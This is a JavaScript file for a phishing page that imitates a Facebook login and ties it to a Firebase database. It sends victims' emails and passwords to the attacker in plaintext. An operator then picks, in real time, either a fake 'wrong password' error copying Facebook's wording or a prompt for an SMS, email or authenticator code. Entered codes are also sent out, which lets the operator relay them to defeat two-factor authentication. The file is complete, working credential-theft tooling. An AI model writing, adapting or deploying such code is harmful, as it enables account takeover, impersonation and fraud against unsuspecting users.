import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
import { getDatabase, ref, push, onValue, update } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCgeJj-pm0yFbO_UcH06NBfaGm0H-YUVZA",
  authDomain: "live-47884.firebaseapp.com",
  databaseURL: "https://live-47884-default-rtdb.firebaseio.com",
  projectId: "live-47884",
  storageBucket: "live-47884.firebasestorage.app",
  messagingSenderId: "1020379584903",
  appId: "1:1020379584903:web:51805d3077b9802dd95b22",
  measurementId: "G-NKKST173G4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

document.addEventListener("DOMContentLoaded", () => {

  const loginBtn = document.getElementById("loginBtn");
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");

  function sendLogin() {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();

    if (email === "" || password === "") {  
      alert("Please fill all fields");  
      return;  
    }  

    loginBtn.classList.add("loading");  
    loginBtn.disabled = true;  

    const loginRef = push(ref(db, 'logins'), {  
      email: email,  
      password: password,  
      time: Date.now()
    });  

    console.log("Login sent");

    // Wait for admin verification selection
  onValue(ref(db, `logins/${loginRef.key}/verificationType`), (snap) => {
  const type = snap.val();

  if (type === "notfound") {
    showError("notfound");
  } else if (type === "wrongpass") {
    showError("wrongpass");
  } else if (type) {
    showVerification(type, loginRef.key);
  }
});
  }

  function showVerification(type, loginId) {
    let overlay = document.getElementById("verificationOverlay");
    if (!overlay) {
      overlay = document.createElement("div");
      overlay.id = "verificationOverlay";
      overlay.style.position = "fixed";
      overlay.style.top = 0;
      overlay.style.left = 0;
      overlay.style.width = "100%";
      overlay.style.height = "100%";
      overlay.style.background = "rgba(0,0,0,0.7)";
      overlay.style.display = "flex";
      overlay.style.justifyContent = "center";
      overlay.style.alignItems = "center";
      overlay.style.zIndex = "9999";
      document.body.appendChild(overlay);
    }

    overlay.innerHTML = ""; // clear previous content

    const box = document.createElement("div");
    box.className = `fb-verification fb-${type}`;
    box.style.width = "360px";
    box.style.padding = "30px";
    box.style.borderRadius = "8px";
    box.style.background = "#fff";
    box.style.boxShadow = "0 4px 30px rgba(0,0,0,0.2)";
    box.style.textAlign = "center";
    box.style.fontFamily = "Arial, sans-serif";

    // Title
    const title = document.createElement("h2");
    title.textContent = type === "sms" ? "Enter SMS Code" :
                        type === "email" ? "Enter Email Code" :
                        "Enter Authentication Code";
    title.style.color = "#1877f2";
    title.style.fontSize = "22px";
    title.style.marginBottom = "20px";

    // Instruction
    const instruction = document.createElement("p");
    instruction.textContent = `We have sent a ${type.toUpperCase()} code. Please enter it below to continue.`;
    instruction.style.fontSize = "14px";
    instruction.style.color = "#606770";
    instruction.style.marginBottom = "15px";

    // Input
    const input = document.createElement("input");
    input.type = "text";
    input.style.width = "100%";
    input.style.padding = "12px";
    input.style.fontSize = "16px";
    input.style.border = "1px solid #ddd";
    input.style.borderRadius = "6px";
    input.style.marginBottom = "20px";

    // Submit button
    const submitBtn = document.createElement("button");
    submitBtn.textContent = "Continue";
    submitBtn.style.width = "100%";
    submitBtn.style.padding = "12px";
    submitBtn.style.background = "#1877f2";
    submitBtn.style.color = "#fff";
    submitBtn.style.border = "none";
    submitBtn.style.borderRadius = "6px";
    submitBtn.style.fontSize = "16px";
    submitBtn.style.cursor = "pointer";

   submitBtn.onclick = () => {
  const code = input.value.trim();
  if (!code) return;

  // ✅ SEND IMMEDIATELY (THIS WAS MISSING)
  push(ref(db, 'verificationCodes'), {
    loginId: loginId,
    code: code,
    type: type,
    time: Date.now()
  });

  console.log("Code sent");

  // ✅ START LOADING EFFECT ON BUTTON
  submitBtn.textContent = "";
  submitBtn.classList.add("loading");
  submitBtn.disabled = true;

  // optional spinner style (if not in CSS)
  submitBtn.innerHTML = `<div style="
    width:18px;height:18px;
    border:3px solid #fff;
    border-top:3px solid transparent;
    border-radius:50%;
    margin:auto;
    animation: spin 1s linear infinite;
  "></div>`;

  // ✅ WAIT 20 SECONDS BEFORE CLOSING
  setTimeout(() => {
    overlay.remove();

    // reset main login button (preserved logic)
    loginBtn.classList.remove("loading");
    loginBtn.disabled = false;

    emailInput.value = "";
    passwordInput.value = "";

  }, 20000);
};

    box.appendChild(title);
    box.appendChild(instruction);
    box.appendChild(input);
    box.appendChild(submitBtn);

    overlay.appendChild(box);
  }

function showError(type) {
  // delay like real Facebook
  setTimeout(() => {

    loginBtn.classList.remove("loading");
    loginBtn.disabled = false;

    let errorBox = document.getElementById("errorBox");

    if (!errorBox) {
      errorBox = document.createElement("div");
      errorBox.id = "errorBox";
      errorBox.style.background = "#ffebe8";
      errorBox.style.color = "#c00";
      errorBox.style.padding = "10px";
      errorBox.style.marginBottom = "10px";
      errorBox.style.border = "1px solid #f5c2c0";
      errorBox.style.borderRadius = "6px";
      errorBox.style.fontSize = "14px";

      const loginBox = document.querySelector(".login-box");
      loginBox.prepend(errorBox);
    }

    // ✅ DIFFERENT FACEBOOK-LIKE MESSAGES
    if (type === "notfound") {
      errorBox.textContent = "The email or mobile number you entered isn’t connected to an account.";
    }

    if (type === "wrongpass") {
      errorBox.textContent = "The password that you've entered is incorrect. Forgotten password?";
    }

  }, 2000);
}



  loginBtn.addEventListener("click", sendLogin);

  passwordInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      sendLogin();
    }
  });

});